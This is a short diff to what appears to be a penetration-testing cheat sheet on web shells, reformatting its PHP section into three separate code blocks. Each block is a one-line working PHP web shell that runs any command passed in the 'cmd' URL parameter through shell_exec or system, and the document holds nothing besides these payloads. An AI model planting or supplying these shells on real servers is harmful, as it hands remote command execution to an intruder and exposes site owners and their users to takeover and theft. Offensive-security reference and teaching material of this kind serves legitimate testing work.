@@ -9,11 +9,16 @@ title: WebShell's - Binaries
 
 ## PHP
 
-- **Simple `PHP` WebShell's**
 
 ```php
 <?php echo shell_exec($_GET["cmd"]);?>
+```
+
+```php
 <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+```
+
+```php
 <?php system($_GET['cmd']);?>
 ```
 
